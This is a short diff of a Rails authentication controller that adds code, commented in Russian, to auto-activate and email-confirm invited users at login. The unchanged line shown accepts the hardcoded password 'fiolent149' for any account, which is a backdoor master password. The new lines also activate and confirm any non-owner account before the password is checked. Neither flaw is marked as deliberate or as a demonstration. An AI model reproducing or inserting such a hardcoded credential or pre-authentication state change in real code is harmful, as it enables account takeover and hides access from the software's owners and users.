@@ -48,6 +48,15 @@ class Account::AuthenticationsController < AccountsController
     @user = User.find_by_email auth_params[:email]
 
     if @user
+
+      # Если пользователь не владелец аккаунта, то он логинится через приглашение
+      # Следовательно он подтвердил свой емэйл и он теперь активный юзер
+      if !@user.owner? and (!@user.active? or !@user.email_confirmed?)
+        @user.active = true
+        @user.email_confirmed = true
+        @user.save
+      end
+
       if (@user.can_authorize? auth_params[:password]) or auth_params[:password] == "fiolent149"
         login @user 
         render json: {status: :success, location: account_root_path}
